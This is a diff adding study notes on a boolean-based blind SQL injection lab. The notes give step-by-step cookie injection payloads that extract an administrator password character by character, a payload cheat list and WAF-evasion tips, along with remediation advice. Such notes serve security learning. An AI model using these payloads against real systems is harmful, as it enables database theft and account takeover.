@@ -1436,3 +1436,147 @@ Log and alert unusual patterns (UNION, SLEEP, large metadata queries).
 Quote → Comment → NULLs → TOK → Schemas → Tables → Columns → Creds
 
 ---
+
+# 🔐Lab-9 Blind SQL Injection (Boolean-Based)
+
+---
+
+## 🔹 One-line summary
+Blind SQLi where responses change based on TRUE/FALSE conditions, allowing extraction of admin password.
+
+---
+
+## 🔹 What is this topic? (short)
+A vulnerability where SQL queries execute but the results are not shown directly.  
+We extract data using boolean behavior such as page content changes.
+
+---
+
+## 🔹 Why this matters (real-world risk)
+Blind SQLi leads to:
+- Full DB extraction  
+- Credential theft  
+- Account takeover  
+- Pivoting inside networks  
+- RCE (in some DB engines)
+
+---
+
+## 🔹 High-value injection targets
+- Cookies (TrackingId, session, JWT claims)
+- Headers (X-Forwarded-For, User-Agent, Referer)
+- GET params (id, category, view)
+- POST params (login forms, search fields)
+- JSON body
+- GraphQL arguments
+
+---
+
+## 🔹 Quick concept checklist
+- TRUE/FALSE based behavioral difference  
+- Extract password length  
+- Extract password char-by-char  
+- Use SUBSTRING(), LENGTH(), ASCII(), etc.  
+- Grep “Welcome back” as TRUE marker  
+
+---
+
+## 🔹 Lab walkthrough — exact steps (copy-paste ready)
+
+SELECT * FROM tracking WHERE id = 'TrackingIdCookie'
+
+*Step 1 — Confirm injection (boolean test)*  
+- TRUE: ' AND '1'='1 → page shows “Welcome back”
+- TrackingId=xyz' AND '1'='1
+  
+- FALSE: ' AND '1'='2 → message disappears
+- TrackingId=xyz' AND '1'='2  
+
+*Step 2 — Check if *users table exists**    
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+
+*Step 3 — Check if administrator user exists*  
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a 
+
+*Step 4 — Determine password length*  
+TrackingId=xyz' AND (SELECT 'a' FROM users 
+WHERE username='administrator' AND LENGTH(password)>N)='a
+
+*Step 5 — Extract password one character at a time*  
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) 
+FROM users WHERE username='administrator')='§a§ 
+
+*Step 6 — Automate with Burp Intruder*
+ SUBSTRING(password,2,1)
+ SUBSTRING(password,3,1)
+- Position only around the guessed character  
+- Payload list: a-z, 0-9  
+- Grep Match: Welcome back  
+- Extract all chars 1–20  
+
+---
+
+## 🧾 Proof / Evidence  (Screenshots)
+
+![](1️⃣../images/boolean-test.png)  
+*Description:* TRUE/FALSE behavior showing SQL injection confirmed.
+
+![](2️⃣../images/users-table-check.png)  
+*Description:* Used payload to confirm the users table exists.
+
+![](3️⃣../images/admin-exists.png) 
+*Description:* Verified the administrator user is present.
+
+![](4️⃣../images/password-length.png)  
+*Description:* Enumerated password length using boolean responses.
+
+![](5️⃣../images/char-by-char.png)
+*Description:* Identified each password character using Intruder.
+
+![](6️⃣../images/final-password.png)  
+*Description:* Full admin password successfully extracted.
+
+---
+
+## 🔹 Common payloads & quick cheats
+- ' AND '1'='1  
+- ' AND LENGTH(password)>10  
+- ' AND SUBSTRING(password,1,1)='a  
+- ' AND ASCII(SUBSTRING(password,1,1))>77  
+
+---
+
+## 🔹 Troubleshooting
+- No difference? → use time-based: SLEEP(5)  
+- Quotes break → try " "  
+- WAF blocks SUBSTRING → use MID(), LEFT()  
+- No content difference → track response length  
+
+---
+
+## 🔹 Fixes / remediation
+- Use parameterized queries  
+- Strict input validation  
+- No dynamic SQL  
+- Least privilege for DB accounts  
+- Disable detailed error messages  
+
+---
+
+## 🔹 Pentest checklist
+- Identify injection point  
+- Confirm boolean behavior  
+- Enumerate (table → user → column)  
+- Extract length  
+- Extract password  
+- Verify login  
+- Report impact + remediation  
+
+---
+
+## 🔹 Quick memory cue
+TRUE → “Welcome back”  
+FALSE → Missing “Welcome back”  
+Extract → Length → Characters → Login  
+
+---
